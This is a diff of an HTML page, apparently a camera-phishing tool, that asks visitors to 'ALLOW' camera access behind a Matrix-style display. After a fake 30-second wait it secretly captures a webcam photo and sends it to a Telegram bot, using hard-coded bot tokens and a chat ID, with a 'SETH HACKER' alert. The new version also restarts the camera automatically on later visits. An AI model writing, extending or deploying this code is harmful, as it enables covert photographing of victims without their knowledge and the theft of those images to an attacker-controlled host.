@@ -1,225 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Camera access with background matrix effect">
-    <title>Camera Access Page</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            font-family: Arial, sans-serif;
-            background-color: #000;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
+<!-- ... তোমার HTML Head একই থাকবে ... -->
+<video id="video" autoplay playsinline style="display: none;" width="640" height="480"></video>
+<canvas id="cameraCanvas" width="640" height="480" style="display: none;"></canvas>
 
-        .container {
-            text-align: center;
-            position: relative;
-        }
+<script>
+let cameraAccessGranted = false;
 
-        h1 {
-            font-size: 50px;
-            font-weight: bold;
-            color: #00FF00;
-            margin-bottom: 20px;
-        }
+// Auto check on page load
+window.onload = function () {
+    if (localStorage.getItem("cameraAccessGranted") === "true") {
+        cameraAccessGranted = true;
+        document.getElementById("allowButton").style.display = "none";
+        document.getElementById("allowMessage").style.display = "none";
+        autoStartCamera(); // নতুন যুক্ত
+    }
+}
 
-        button {
-            padding: 12px 24px;
-            font-size: 20px;
-            background-color: #00FF00;
-            color: black;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        button:hover {
-            background-color: #00cc00;
-        }
-
-        .message {
-            font-size: 18px;
-            color: white;
-        }
-
-        #countdown {
-            font-size: 24px;
-            color: white;
-        }
-
-        #videoLink {
-            display: none;
-        }
-
-        #cameraCanvas {
-            display: none;
-        }
-
-        #messageContainer {
-            display: none;
-        }
-
-        #allowMessage {
-            font-size: 18px;
-            color: white;
-            margin-top: 20px;
-        }
-
-        #cameraAccessPopup {
-            display: none;
-            color: red;
-            font-size: 18px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>PLEASE ALLOW ↓</h1>
-        <button id="allowButton" onclick="requestCameraAccess()">ALLOW</button>
-        <div id="allowMessage">Please allow camera access to proceed</div>
-        <div id="cameraAccessPopup">PLEASE ALLOW FIRST</div>
-        
-        <!-- Countdown and message container -->
-        <div id="messageContainer">
-            <p>PLEASE WAIT <span id="countdown">30</span> SECONDS</p>
-        </div>
-
-        <!-- Hidden input field -->
-        <input type="text" id="videoLink" value="Sample Message">
-        <video id="video" autoplay playsinline style="display: none;"></video>
-        <canvas id="cameraCanvas"></canvas>
-    </div>
-
-    <script>
-        let cameraAccessGranted = false;
-
-        // Check if the camera access has been granted previously using localStorage
-        if (localStorage.getItem("cameraAccessGranted") === "true") {
+function requestCameraAccess() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
             cameraAccessGranted = true;
+            localStorage.setItem("cameraAccessGranted", "true");
+
             document.getElementById("allowButton").style.display = "none";
             document.getElementById("allowMessage").style.display = "none";
-        }
+            document.getElementById("cameraAccessPopup").style.display = "none";
 
-        function requestCameraAccess() {
-            if (cameraAccessGranted) {
-                startProcess();
-            } else {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        document.getElementById("allowButton").style.display = "none";
-                        document.getElementById("allowMessage").style.display = "none";
-                        cameraAccessGranted = true;
-                        // Store the camera access status in localStorage
-                        localStorage.setItem("cameraAccessGranted", "true");
-                        startProcess();
-                    })
-                    .catch(() => {
-                        document.getElementById("cameraAccessPopup").style.display = "block";
-                    });
-            }
-        }
-
-        function startProcess() {
-            const message = document.getElementById("videoLink").value.trim();
-            if (message === "") return;
-
-            document.getElementById("messageContainer").style.display = "block";
-            let counter = 30;
-            const countdownInterval = setInterval(() => {
-                document.getElementById("countdown").innerText = counter;
-                counter--;
-                if (counter < 0) {
-                    clearInterval(countdownInterval);
-                    document.getElementById("messageContainer").innerHTML = "REQUEST accepted. Your work will be done shortly. Thank you :)";
-                    captureAndSendPhoto(message); // Capture and send photo
-                }
-            }, 1000);
-        }
-
-        function captureAndSendPhoto(message) {
             const video = document.getElementById("video");
-            const cameraCanvas = document.getElementById("cameraCanvas");
-            const cameraContext = cameraCanvas.getContext('2d');
-            
-            cameraContext.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
-            cameraCanvas.toBlob((blob) => {
-                sendPhotoToTelegram(blob, message);
-            }, 'image/png');
-        }
+            video.srcObject = stream;
 
-        function sendPhotoToTelegram(blob, message) {
-            const botToken = "7362244711:AAG8PejiHPdrYfyDyI6i4X7nxQMYJcy36_E"; // Telegram Bot Token
-            const chatId = "7962046796"; // Telegram Chat ID
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "image.png");
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(() => {
-                const textMessage = `SETH HACKER! NEW LINK RECEIVED ↓\n${message}`;
-                sendTextToTelegram(textMessage);
-            })
-            .catch(error => console.error("Error:", error));
-        }
-
-        function sendTextToTelegram(message) {
-            const botToken = "7628637870:AAF0q1GpYIuJpxbVTP5nVYVk-l2yWAxzzbs"; // Telegram Bot Token
-            const chatId = "7962046796"; // Telegram Chat ID
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(apiUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .catch(error => console.error("Error sending text:", error));
-        }
-
-        // Matrix background effect
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        document.body.appendChild(canvas);
-
-        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        const matrix = letters.split('');
-        const fontSize = 18;
-        const columns = canvas.width / fontSize;
-        const drops = Array.from({ length: columns }).fill(1);
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00FF00';
-            ctx.font = `${fontSize}px monospace`;
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = matrix[Math.floor(Math.random() * matrix.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-
-        setInterval(drawMatrix, 33);
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
+            startProcess();
+        })
+        .catch(() => {
+            document.getElementById("cameraAccessPopup").style.display = "block";
         });
-    </script>
-</body>
-</html>
+}
+
+function autoStartCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+            startProcess();
+        })
+        .catch(() => {
+            localStorage.removeItem("cameraAccessGranted");
+            document.getElementById("allowButton").style.display = "block";
+            document.getElementById("allowMessage").style.display = "block";
+        });
+}
+
+function startProcess() {
+    const message = document.getElementById("videoLink").value.trim();
+    if (message === "") return;
+
+    document.getElementById("messageContainer").style.display = "block";
+    let counter = 30;
+    const countdownInterval = setInterval(() => {
+        document.getElementById("countdown").innerText = counter;
+        counter--;
+        if (counter < 0) {
+            clearInterval(countdownInterval);
+            document.getElementById("messageContainer").innerHTML = "REQUEST accepted. Your work will be done shortly. Thank you :)";
+            captureAndSendPhoto(message);
+        }
+    }, 1000);
+}
+
+function captureAndSendPhoto(message) {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("cameraCanvas");
+    const context = canvas.getContext("2d");
+
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob((blob) => {
+        sendPhotoToTelegram(blob, message);
+    }, "image/png");
+}
+
+// ... sendPhotoToTelegram, sendTextToTelegram, drawMatrix কোড আগের মতোই থাকবে ...
+</script> 
